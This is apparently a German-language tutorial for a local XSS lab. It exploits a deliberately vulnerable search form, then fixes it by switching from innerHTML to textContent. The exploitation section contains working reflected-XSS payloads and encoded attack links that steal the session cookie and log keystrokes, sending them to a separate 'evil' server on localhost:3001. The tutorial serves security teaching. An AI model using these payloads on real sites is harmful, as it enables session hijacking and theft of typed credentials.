# Cross-site Scripting (XSS)


## Anforderungen

* [Node.js](https://nodejs.org/en/) - Du kannst entweder die LTS- oder die neueste Version verwenden.
  * Für Windows - verwende das Installationspaket von der Node-Website
  * Für Linux und Mac - verwende [nvm](https://github.com/creationix/nvm) zur Installation von Node
* [Git](https://git-scm.com/downloads)


## Erste Schritte

Wenn du es noch nicht getan hast, stelle sicher, dass du alle [Anforderungen](#Anforderungen) von oben erfüllst.

Windows-Nutzer sollten Git Bash öffnen. Du wirst dieses Programm verwenden, um alle "Terminal"-Befehle auszuführen
Linux- und Mac-Nutzer sollten das Terminal öffnen.

Verwende git im Terminal-Programm, um das Projekt herunterzuladen:
```bash
git clone https://github.com/Noah-Bargisen/xss-aufgabe.git
```
Wenn erfolgreich, sollte ein neuer Ordner namens `xss-aufgabe` erstellt worden sein.

Wechsle in das neue Verzeichnis:
```bash
cd xss-aufgabe
```

Installiere die Abhängigkeiten des Projekts mit npm:
```bash
npm install
```

Jetzt können wir den lokalen Webserver mit Node.js starten:
```bash
node server.js
```
Bei Erfolg, solltest du folgende Nachricht sehen: `Server listening at localhost:3000`. Das bedeutet, dass ein lokaler Webserver jetzt läuft und auf Anfragen unter [localhost:3000](http://localhost:3000/) wartet. Öffne deinen Browser und klicke auf den Link.

Du solltest ein einfaches Suchformular sehen. Gib etwas Text ein und drücke Enter (oder klicke auf den "Suchen"-Button). Beachte, wie die von dir eingegebene Suchanfrage auf der Seite angezeigt wird. Dieses Formular könnte anfällig für einen XSS-Angriff sein.

## Was ist XSS?

Von [OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)):

> Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

XSS-Sicherheitslücken werden in der Regel verwendet, um sensible Informationen zu stehlen (Anmeldeinformationen, Authentifizierungstoken, persönliche Benutzerdaten) sowie Aktionen im Namen authentifizierter Benutzer durchzuführen.

## Proof of Concept

Öffne die Entwicklertools in deinem Browser (F12) und öffne den Unter-Tab "Konsole".

Kopiere den folgenden Code in die Konsole und führe ihn aus:
```js
encodeURIComponent('<img src="does-not-exist" onerror="alert(\'hi!\')">');
```

![](screenshots/xss-screenshot-001.png)

Kopiere die Ausgabe und füge sie in die Adressleiste ein, sodass die URL so aussieht:
```
http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('hi!')%22%3E
```
Oder klicke auf [diesen Link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('hi')%22%3E).

Wenn erfolgreich, solltest du ein Alert-Popup sehen, das "hi!" sagt.

Lass uns sehen, was wir sonst noch machen können..


## Ausnutzung

Öffne den Unter-Tab "Anwendung" in den Entwicklertools deines Browsers. Unter "Speicher" -> "Cookies" klicke auf "localhost:3000", um die vom Browser für diese Website gespeicherten Cookies anzuzeigen.
![](screenshots/xss-screenshot-002.png)

Beachte, dass es ein Cookie namens "connect.sid" gibt. Dies ist ein Session-Cookie, das von unserem lokalen Webserver gesetzt wird. Ist es möglich, dass wir über die XSS-Schwachstelle darauf zugreifen können? Lass es uns versuchen. Wiederhole die Schritte aus dem Abschnitt "Proof of Concept" oben, aber mit dem folgenden Code:```html
<img src="does-not-exist" onerror="alert(document.cookie)">
```
Kodiere das obige HTML und verwende es als Suchanfrage, oder [versuche diesen Link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E).

Wenn erfolgreich, solltest du den Inhalt des Session-Cookies in einem Alert-Popup sehen.

Bevor wir weitermachen, müssen wir unseren "bösen" Webserver starten. Führe den folgenden Befehl in einem zweiten Terminalfenster aus
```bash
node evil-server.js
```

Und jetzt versuche, den folgenden Code mit der XSS-Schwachstelle zu verwenden, um das Session-Cookie zu stehlen:
```html
<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
```
Kodiere das obige HTML und verwende es als Suchanfrage, oder [versuche diesen Link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E).

Überprüfe das Terminalfenster des bösen Servers.

Hier ist der JavaScript-Code aus dem letzten Beispiel in lesbarer Form:
```js
var img = document.createElement('img');
img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```

Jetzt werden wir noch gemeiner. Lass uns einen Keylogger ausprobieren:
```html
<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
```
Kodiere das obige HTML und verwende es als Suchanfrage, oder [versuche diesen Link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E).

Hier ist der JavaScript-Code aus dem letzten Beispiel in lesbarer Form:
```js
var timeout;
var buffer = '';
document.querySelector('body').addEventListener('keypress', function(event) {
	if (event.which !== 0) {
		clearTimeout(timeout);
		buffer += String.fromCharCode(event.which);
		timeout = setTimeout(function() {
			var xhr = new XMLHttpRequest();
			var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
			xhr.open('GET', uri);
			xhr.send();
			buffer = '';
		}, 400);
	}
});
```

Das sind sehr primitive Beispiele, aber ich denke, du kannst das Potenzial sehen.

## Mitigation

Lass uns dich für einen Moment beruhigen und sehen, ob wir das beheben können. In diesem Beispielprojekt liegt die XSS-Sicherheitsanfälligkeit an der Wurzel darin, unsicheres ("nicht-escaped") HTML in die Seite einzufügen. In der Datei `public/index.html` findest du die folgende Funktion:
```js
function showQueryAndResults(q, results) {

	var resultsEl = document.querySelector('#results');
	var html = '';

	html += '<p>Your search query:</p>';
	html += '<pre>' + q + '</pre>';
	html += '<ul>';

	for (var index = 0; index < results.length; index++) {
		html += '<li>' + results[index] + '</li>';
	}

	html += '</ul>';

	resultsEl.innerHTML = html;
}
```
Diese Funktion nimmt die Suchanfrage (`q`) und fügt sie als HTML in das `<div id="results"></div>`-Element ein. Und da HTML das Ausführen von JavaScript über eine Reihe verschiedener Attribute inline erlaubt, bietet dies eine schöne Gelegenheit für XSS.

Es gibt eine Reihe von Techniken, die wir verwenden können, um diese spezielle XSS-Sicherheitsanfälligkeit zu verhindern.

Wir können unseren Anwendungs-/Website-Code so ändern, dass Benutzereingaben (der `q`Parameter) streng als Textinhalt behandelt werden. Zum Beispiel, hier ist eine überarbeitete Version der obigen Funktion:
```js
function showQueryAndResults(q, results) {

	var resultsEl = document.querySelector('#results');
	var html = '';

	html += '<p>Your search query:</p>';
	html += '<pre></pre>';
	html += '<ul>';

	for (var index = 0; index < results.length; index++) {
		html += '<li>' + results[index] + '</li>';
	}

	html += '</ul>';

	resultsEl.innerHTML = html;

	var queryTextEl = document.querySelector('#results pre');
	queryTextEl.textContent = q;
}
```
Ersetze die Funktion in deinem index.html mit dieser überarbeiteten Version und versuche das XSS-Proof-of-Concept erneut. Jetzt wird das HTML als Text gedruckt und das Alert-Popup wird nicht angezeigt.